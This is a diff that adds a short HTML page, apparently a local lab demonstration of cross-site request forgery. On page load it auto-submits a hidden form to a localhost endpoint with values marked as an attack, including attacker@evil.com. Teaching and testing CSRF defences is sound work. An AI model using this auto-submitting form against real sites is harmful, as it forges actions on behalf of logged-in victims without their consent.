@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+  <body onload="document.forms[0].submit()">
+    <h3>Simulasi CSRF Berjalan...</h3>
+    <form action="http://127.0.0.1:5000/form" method="POST">
+      <input type="hidden" name="name" value="💀 CSRF ATTACK 💀">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+  </body>
+</html>
